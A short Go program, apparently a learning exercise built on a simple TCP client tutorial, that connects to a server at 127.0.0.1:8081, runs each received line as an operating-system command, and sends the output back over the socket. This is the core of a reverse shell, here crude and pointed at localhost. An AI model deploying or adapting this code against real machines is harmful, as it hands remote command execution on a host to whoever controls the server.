package main

// https://systembash.com/a-simple-go-tcp-server-and-tcp-client/
import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
)

func main() {

	// connect to this socket
	conn, err := net.Dial("tcp", "127.0.0.1:8081")
	if err != nil {
		log.Fatalf("Unable to connect", err)

	}
	fmt.Println("connected")
	messageReceived := false

	for {
		var message string
		// listen for message from server
		fmt.Println("START OF LOOP")

		if messageReceived == false {

			message, _ = bufio.NewReader(conn).ReadString('\n')
			//fmt.Print("Message from server: " + message)
			// execute command
			// send to socket
			fmt.Println("message received", message)

			cmd := exec.Command(strings.TrimSpace(message))
			out, err := cmd.CombinedOutput()
			if err != nil {
				log.Fatalf("cmd.Run() failed with %s\n", err)

			}
			fmt.Println("OUTPUT TO SEND: ", string(out))
			//directory2 := string(directory[:])
			fmt.Fprintf(conn, string(out)+"\n")
			messageReceived = true
		} else {
			message, _ = bufio.NewReader(conn).ReadString('\n')
			messageReceived = false
		}

	}
}
